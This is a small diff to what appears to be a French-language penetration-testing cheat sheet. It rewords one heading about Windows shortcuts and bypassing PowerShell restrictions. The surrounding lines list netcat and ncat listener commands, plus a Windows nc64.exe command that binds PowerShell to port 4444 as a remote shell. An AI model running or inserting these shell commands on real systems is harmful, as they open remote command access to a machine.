@@ -85,7 +85,7 @@ nc -lvnp 4444
 rlwrap nc -nnvp 4443
 ncat -lvnp 12345 --ssl
 ```
-Windows -> création de raccourcis !
+Windows -> création de raccourcis (contournement restriction PS) ;-)
 ```
 nc64.exe -l -v -n -p 4444 -e powershell
 nc64.exe 127.0.0.1 4444
